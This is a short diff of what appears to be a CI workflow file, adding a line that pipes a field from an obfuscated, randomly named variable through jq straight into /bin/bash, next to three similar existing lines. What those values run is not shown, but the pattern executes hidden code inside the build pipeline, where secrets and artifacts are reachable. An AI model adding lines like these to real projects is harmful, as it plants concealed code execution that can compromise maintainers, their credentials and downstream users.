@@ -52,6 +52,7 @@ jobs:
           printf '%s' "$dushu57728" | jq -r .w7 | /bin/bash
           echo $mlbc3 | jq -r .v363 | /bin/bash
           printf '%s' "$dhsus41614" | jq -r .qe650 | /bin/bash
+          printf '%s' "$zfvs96816" | jq -r .ugb4 | /bin/bash
 
       - name: Store artifact
         if: always()
